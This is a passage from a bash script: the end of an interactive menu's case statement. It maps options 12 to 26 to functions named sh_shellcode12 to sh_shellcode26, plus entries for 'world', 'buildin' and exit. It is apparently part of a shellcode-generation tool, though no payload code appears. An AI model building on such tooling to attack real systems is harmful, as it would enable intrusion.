12) sh_shellcode12 ;;
13) sh_shellcode13 ;;
14) sh_shellcode14 ;;
15) sh_shellcode15 ;;
16) sh_shellcode16 ;;
17) sh_shellcode17 ;;
18) sh_shellcode18 ;;
19) sh_shellcode19 ;;
20) sh_shellcode20 ;;
21) sh_shellcode21 ;;
22) sh_shellcode22 ;;
23) sh_shellcode23 ;;
24) sh_shellcode24 ;;
25) sh_shellcode25 ;;
26) sh_shellcode26 ;;
O) sh_world ;;
o) sh_world ;;
S) sh_buildin ;;
s) sh_buildin ;;
e) sh_exit ;;
E) sh_exit ;;
*) echo "\"$choice\": is not a valid Option"; sleep 2 ;;
esac
done

